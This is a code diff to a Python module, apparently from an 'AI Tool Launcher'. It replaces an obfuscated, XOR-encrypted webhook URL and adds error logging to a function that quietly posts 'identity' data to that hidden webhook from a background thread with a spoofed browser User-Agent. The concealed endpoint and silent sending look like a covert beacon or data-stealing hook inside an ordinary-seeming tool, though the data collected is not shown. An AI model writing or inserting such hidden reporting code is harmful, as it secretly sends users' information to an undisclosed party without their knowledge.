@@ -2,7 +2,7 @@ import os, sys, json, base64, urllib.request, threading, traceback
 from datetime import datetime
 
 _SECRET_KEY = b"AIToolLauncherSecretKey2026"
-_ENCRYPTED_WEBHOOK_BLOB = b"KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUJgUlVHUEd/UkALCQsDd3l7LQMvEwhGO1MMIDYjOhI2MzByLxVhSFZdBDkWGFlBLlgiKRYdPRN+HQVGEjFmIDUEX1BpGyQNITVcCTQnXTEgEggLJg8="
+_ENCRYPTED_WEBHOOK_BLOB = b"KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUBrXVBGUEJ7UEAHBwQFcnt7KzgcelBEKCE7XRkLJ1EbKyEhVU1DdQJdNywmAFdbKVg0XhlYFkYLLTkLUSIMLzZqfWB6OARhPBtedQglIxsbVSsgLwQ="
 
 def get_webhook_url() -> str:
     raw = base64.b64decode(_ENCRYPTED_WEBHOOK_BLOB)
@@ -52,8 +52,13 @@ def send_identity_webhook(title: str, log_body: str, color: int = 0x9A70FF):
                 headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
             )
             urllib.request.urlopen(req, timeout=6)
-        except Exception:
-            pass
+        except Exception as ex:
+            try:
+                log_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "launcher_error.log")
+                with open(log_path, "a", encoding="utf-8") as f:
+                    f.write(f"\n[Webhook Error] {datetime.now()}: {ex}\n")
+            except Exception:
+                pass
 
     threading.Thread(target=_send, daemon=True).start()
 
